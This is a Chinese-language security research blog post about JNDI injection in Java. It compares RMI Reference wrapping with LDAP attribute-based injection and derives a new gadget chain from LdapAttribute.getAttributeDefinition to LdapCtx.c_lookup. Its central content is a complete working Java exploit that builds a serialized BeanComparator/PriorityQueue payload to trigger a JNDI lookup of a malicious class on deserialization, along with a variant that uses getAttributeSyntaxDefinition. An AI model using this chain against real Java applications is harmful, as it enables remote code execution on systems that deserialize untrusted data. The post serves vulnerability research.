---
title: "JNDI Reference那些事和LdapAttribute getter JNDI"
onlyTitle: true
date: 2025-6-10 16:58:26
categories:
- java
- other漏洞
tags:
- JNDI
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8161.jpg
---



在触发JNDI注入的时候，我们用到的一个JNDI Client如下，用的LDAP协议：

```java

public class JDNIRMIClient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        RemoteInterface remoteObject = (RemoteInterface) initialContext.lookup("ldap://127.0.0.1:1099/#JNDI_RuntimeEvil");//need ldap 
        remoteObject.sayHello("JNDI");
    }
}
```

## JNDI Reference那些事

JNDI实际上在两个类型下走的是两个注入逻辑

### 类型1：RMI Reference封装

marshalsec生成的就是这个类型的poc

在RMI协议下，用Reference封装传输的类，是会经过RegistryContext.lookup调用decodeObject去解封装的。跟进这个decodeObject可以发现，调用了NamingManager.getObjectInstance

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604162529427.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604162548373.png)

接下来的代码我们很熟悉了，就是判断是否为Reference，并调用getObjectFactoryFromReference和factory.getObjectInstance

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604162840413.png)

从InitialContext开始调用栈如下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604162949263.png)



事实上RMI型进行JNDI注入也必须用Reference封装，详情见https://godownio.github.io/2024/09/25/jndi-zhu-ru/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90

### 类型2：LDAP 非Reference封装

LDAP协议进行JNDI注入时不需要用Reference封装，我们看栈，跟上面对比得到不同的是从URL生成的Context是ldapURLContext，导致了后续的处理不同

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172421360.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172456975.png)

在LdapCtx.c_lookup中，调用了DirectoryManager.getObjectInstance

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172549271.png)

可以发现DirectoryManager.getObjectInstance和NamingManager.getObjectInstance几乎没区别

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172656933.png)

因为NamingManager的作用如下：

- 作用范围较广，包含普通命名服务（如：`java:comp/env`）的处理。

- 处理 URL 前缀（如：`ldap:`、`rmi:`、`corba:`）并定位适当的上下文工厂。

DirectoryManager是 `NamingManager` 的一个子集或专门扩展，**专门用于支持目录服务（如 LDAP）相关操作**。处理带属性的对象工厂实例创建，类似于 NamingManager，但面向更“结构化”的服务，如 LDAP 目录。两个的核心逻辑其实没什么区别

### 二者的区别

我们回过头来看为什么RMI不能用非Reference去注入，跟进这个registry.lookup

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604170940427.png)

是我们熟悉的RegistryImpl_Stub.lookup，不过这个方法显然只能触发RMI的原生反序列化攻击，也就是JRMP，而不是JNDI，它并没有调用到getObjectFactoryFromReference和factory.getObjectInstance，可以说JNDI我们只看这两个方法，而不是lookup

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604171016229.png)

所以我们理论上可以总结为，RMI打JNDI就是要用Reference封装，而Ldap打JNDI，我们是自己写了一个Ldap服务器，你去看代码逻辑可以知道是把恶意http地址绑定在了attribute上，而没有用到Reference



## LdapAttribute JNDI

根据上面Ldap协议打JNDI提到的链，可以知道不止InitialContext能触发JNDI，这条链上的方法理论上都能触发，不过这些方法显然反序列化不好触发

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172421360.png)

也就是包括以下方法：

```java
c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
```

把sun包加到库后再查找用法（不然不准），用8u65的sun包就行

找到ComponentContext#c_resolveIntermediate_nns调用了c_lookup

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605101738354.png)

给个链子：

```java
	LdapAttribute.getAttributeDefinition() ->
    PartialCompositeDirContext.getSchema() ->
    ComponentContext.p_getSchema() -> p_resolveIntermediate() -> c_resolveIntermediate_nns()
    LdapCtx.c_lookup() ->
    DirectoryManager.getObjectInstance
```

到source点，LdapAttribute.getAttributeDefinition是个getter，我们需要注意的关键是这个函数是没有参数的，这才严格满足getter的定义

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605105427317.png)

### poc构造

我们找一个触发到getter的地方，cb链的PropertyUtils.getProperty、jackson原生反序列化POJONode链、fastjson 1.2.83原生反序列化JSONObject、rome链等都可以

参数的话，可以打ldap JNDI的时候打个断点，看下向LdapCtx.c_lookup传的参数，为var1和var2

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605110642551.png)

向上分析，得知参数来自getSchema的参数，第二个参数Continuation根据Name var1就能得到

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605111831051.png)

于是我们只用控制rdn为我们需要的CompositeName，以及getBaseCtx返回PartialCompositeContext

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605111928961.png)

getBaseCtx默认返回InitialDirContext

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605112243197.png)

我们手动设置的话，这个参数为transient

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605112758938.png)

不过不重要，序列化时会变相存储这个字段

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605112842138.png)

这里以cb链触发getter为例给个poc：

LdapCtx构造函数参数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250610164605462.png)

注意在p_resolveIntermediate有个p_parseComponent，需要var5和var6不为空才去解析后面

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250610165226802.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250610165409930.png)

那么类名前面随便加个xx/就行了，如`a/#JNDI_RuntimeEvil`

```java
package org.exploit.misc;


import com.sun.jndi.ldap.LdapCtx;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;

import javax.naming.CompositeName;
import javax.naming.Name;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Hashtable;
import java.util.PriorityQueue;

//anyToGetter -> LdapAttribute.getAttributeDefinition() ->
//    PartialCompositeDirContext.getSchema() ->
//    ComponentContext.p_getSchema() -> p_resolveIntermediate() -> c_resolveIntermediate_nns()
//    LdapCtx.c_lookup() ->
//    DirectoryManager.getObjectInstance JNDI
public class LdapAttribute_getterToJNDI {
    public static void main(String[] args) throws Exception {

        CompositeName compositeName = new CompositeName("a/#JNDI_RuntimeEvil");
        Class<?> ldapAttributeClass = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor<?> ldapAttributeClassConstructor = ldapAttributeClass.getDeclaredConstructor(String.class, DirContext.class, Name.class);
        ldapAttributeClassConstructor.setAccessible(true);
        Hashtable<String, String> env = new Hashtable<>();
        LdapCtx ldapContext = new LdapCtx("","127.0.0.1",1099, env, false);
        Object ldapAttributeInstance = ldapAttributeClassConstructor.newInstance("godown", ldapContext, compositeName);
//        Field baseCtxURL = ldapAttributeInstance.getClass().getDeclaredField("baseCtxURL");
//        baseCtxURL.setAccessible(true);
//        baseCtxURL.set(ldapAttributeInstance,"ldap://127.0.0.1:1099/");

        BeanComparator beanComparator = new BeanComparator("attributeDefinition");
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(1,new TransformingComparator<>(new ConstantTransformer<>(1)));
        priorityQueue.add(ldapAttributeInstance);
        priorityQueue.add(ldapAttributeInstance);
        Field compareField = PriorityQueue.class.getDeclaredField("comparator");
        compareField.setAccessible(true);
        compareField.set(priorityQueue,beanComparator);
        serialize(priorityQueue);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250610165623831.png)

在查找用法中不仅LdapAttribute.getAttributeDefinition可用，getAttributeSyntaxDefinition也可用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605105604138.png)

所以改成`BeanComparator beanComparator = new BeanComparator("attributeSyntaxDefinition");`也能成功触发

不过因为需要反射调用LdapAttribute构造函数的原因，不能在fastjson这种里面去使用，还是有一些局限性
